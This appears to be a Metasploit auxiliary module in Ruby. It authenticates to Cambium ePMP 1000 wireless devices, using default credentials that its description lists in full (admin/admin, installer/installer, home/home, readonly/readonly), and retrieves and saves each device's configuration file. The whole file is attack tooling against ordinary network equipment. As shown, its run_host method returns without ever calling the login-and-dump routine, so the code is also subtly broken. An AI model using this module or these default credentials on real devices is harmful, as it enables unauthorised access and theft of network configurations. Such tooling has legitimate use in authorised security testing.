##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::EPMP

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Cambium ePMP 1000 Dump Device Config',
      'Description' => %{
          This module dumps Cambium ePMP 1000 device configuration file. An
          ePMP 1000 box has four (4) login accounts - admin/admin, installer/installer,
          home/home, and readonly/readonly. This module requires any one of the following
          login credentials - admin / installer / home - to dump device configuration
          file.
      },
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'References' =>
        [
          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/']
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])
      ], self.class
    )

    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
  end

  def run_host(ip)
    unless is_app_epmp1000?
      return
    end
  end

  # Dump config
  def dump_config(config_uri, cookie)
    print_status("#{rhost}:#{rport} - Attempting to dump configuration...")
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => config_uri,
        'cookie' => cookie,
        'headers' => {
          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language' => 'en-US,en;q=0.5',
          'Connection' => 'close'
        }
      }, 25
    )

    good_response = (
      res &&
      res.code == 200 &&
      res.body =~ /device_props/
    )

    if good_response
      print_good("#{rhost}:#{rport} - File retrieved successfully!")
      path = store_loot('ePMP_config', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 device config')
      print_status("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
    end
  end

  #
  # Login & initiate dump_config
  #

  def do_login(epmp_ver)
    if epmp_ver < '3.4.1' # <3.4.1 uses login_1
      cookie, config_uri_dump_config = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
      if cookie == 'skip' && config_uri_dump_config == 'skip'
        return
      else
        dump_config(config_uri_dump_config, cookie)
      end
    else
      cookie, config_uri_dump_config = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver) # 3.4.1+ uses login_2
      if cookie == 'skip' && config_uri_dump_config == 'skip'
        return
      else
        dump_config(config_uri_dump_config, cookie)
      end
    end
  end
end
